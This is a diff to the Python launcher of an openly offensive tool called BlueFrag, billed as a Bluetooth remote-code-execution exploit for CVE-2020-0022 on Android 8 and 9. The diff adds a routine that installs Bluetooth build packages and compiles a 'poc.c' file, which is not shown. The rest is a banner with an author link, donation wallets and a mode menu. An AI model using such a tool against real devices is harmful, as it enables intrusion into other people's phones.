@@ -1,6 +1,17 @@
 from os import system as sh
 from time import sleep
 
+def install():
+    tr = sh('rm installed')
+    tr = sh('ls | grep poc >> installed')
+    f = open('installed')
+    if f.readline() != "poc\n":
+        print("Installing and compiling dependencies...")
+        sleep(3)
+        tr = sh('apt install gcc g++ build-essential bluetooth libbluetooth-dev bluez -y')
+        tr = sh('gcc poc.c -lbluetooth -o poc')
+        tr = sh('clear')
+install()
 lines = 0
 sh('figlet "BlUe|FrAg"')
 print("Author: https://vk.com/id377607431")
@@ -9,8 +20,8 @@ print("Description: BlueTooth RCE Exploit based on vuln CVE-2020-0022 By CodeNam
 print("This Exploit support Android 8 and 9")
 print()
 print("Donate: Qiwi: 79881301595")
-print("         WMR: R755498264558")
-print("         WMZ: Z088857910482")
+print("        WMR: R755498264558")
+print("        WMZ: Z088857910482")
 print()
 print("==========MODES==========")
 print("Target scan for exploit: (1)")
